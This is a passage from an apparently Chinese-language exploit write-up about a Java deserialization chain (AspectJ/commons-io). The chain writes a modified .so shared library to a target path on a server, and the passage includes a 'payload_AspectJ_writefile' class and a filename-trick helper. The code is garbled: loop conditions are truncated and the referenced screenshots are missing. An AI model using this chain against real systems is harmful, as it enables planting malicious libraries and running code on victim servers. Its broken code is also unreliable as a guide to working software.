    public static char fakeChar(char[] fileName){
        char[] fs=new char[fileName.length+1];
        System.arraycopy(fileName,0,fs,0,fileName.length);
        for (char i = 1; i 0){
                return i;
            }
        }
        return 0;
    }
执行效果如下
### 3.so文件的修改
这里需要一点二进制的知识，首先确定下我们要修改哪个函数
修改如下即可
### 4.写二进制文件
commons-io的链只支持写文本文件，这里测试了一下，不进行base64编码进行单纯文本方式操作二进制文件写入文件前后会产生一些奇妙的变化
议题作者给出了写二进制文件的一条新链
在进行了base64编码后就不存在上述问题，这里感谢浅蓝师傅提供了一些构造帮助，最后此链构造如下：
    /**
     * @auther Skay
     * @date 2021/8/13 14:25
     * @description
     */
    public class payload_AspectJ_writefile {
        public static void write_so(String target_path){
            byte[] bom_buffer_bytes = readFileInBytesToString("./beichen.so");
            //写文本时要填充数据
    //        String so_content = new String(bom_buffer_bytes);
    //        for (int i=0;i bytes = new ArrayList<>();
            try {
                if (file.exists()) {
                    DataInputStream isr = new DataInputStream(new FileInputStream(
                            file));
                    byte[] tempchars = new byte[readArraySizePerRead];
                    int charsReadCount = 0;
                    while ((charsReadCount = isr.read(tempchars)) != -1) {
                        for(int i = 0 ; i 
* * *